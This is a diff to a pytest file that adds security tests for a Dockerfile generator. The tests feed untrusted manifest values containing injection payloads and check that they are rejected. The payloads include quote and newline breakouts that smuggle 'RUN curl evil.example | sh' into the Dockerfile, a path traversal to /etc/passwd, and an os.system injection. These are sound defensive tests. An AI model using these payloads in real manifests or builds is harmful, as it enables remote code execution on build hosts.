@@ -1,4 +1,5 @@
-from rufo_control_plane.build.dockerfile import synthesize_dockerfile
+import pytest
+from rufo_control_plane.build.dockerfile import UnsafeManifestError, synthesize_dockerfile
 from rufo_core.manifest import AgentManifest
 
 
@@ -60,3 +61,42 @@ def test_dockerfile_installs_git_before_pip_install():
     dockerfile = synthesize_dockerfile(_manifest(), has_deploy_config=False)
     assert "apt-get install -y --no-install-recommends git" in dockerfile
     assert dockerfile.index("apt-get install") < dockerfile.index("pip install")
+
+
+# --- security: rufo.toml is untrusted input from whichever org submitted it ---
+
+
+def test_rejects_dependency_name_that_would_break_out_of_quoted_pip_args():
+    manifest = _manifest(dependencies={'x"\nRUN curl evil.example | sh\nRUN echo "y': "1.0"})
+    with pytest.raises(UnsafeManifestError):
+        synthesize_dockerfile(manifest, has_deploy_config=False)
+
+
+def test_rejects_dependency_version_with_shell_metacharacters():
+    manifest = _manifest(dependencies={"langgraph": '1.0"; RUN curl evil.example | sh #'})
+    with pytest.raises(UnsafeManifestError):
+        synthesize_dockerfile(manifest, has_deploy_config=False)
+
+
+def test_rejects_entrypoint_module_with_quote_injection():
+    manifest = _manifest(entrypoint_module='agent.py"\nRUN whoami\n#')
+    with pytest.raises(UnsafeManifestError):
+        synthesize_dockerfile(manifest, has_deploy_config=False)
+
+
+def test_rejects_policy_file_path_traversal():
+    manifest = _manifest(policy_file="../../etc/passwd")
+    with pytest.raises(UnsafeManifestError):
+        synthesize_dockerfile(manifest, has_deploy_config=False)
+
+
+def test_rejects_entrypoint_attr_that_isnt_a_python_identifier():
+    manifest = _manifest(entrypoint_attr='agent; __import__("os").system("whoami")')
+    with pytest.raises(UnsafeManifestError):
+        synthesize_dockerfile(manifest, has_deploy_config=False)
+
+
+def test_accepts_realistic_extras_and_version_specs():
+    manifest = _manifest(dependencies={"uvicorn[standard]": ">=0.32,<1.0"})
+    dockerfile = synthesize_dockerfile(manifest, has_deploy_config=False)
+    assert '"uvicorn[standard]>=0.32,<1.0"' in dockerfile
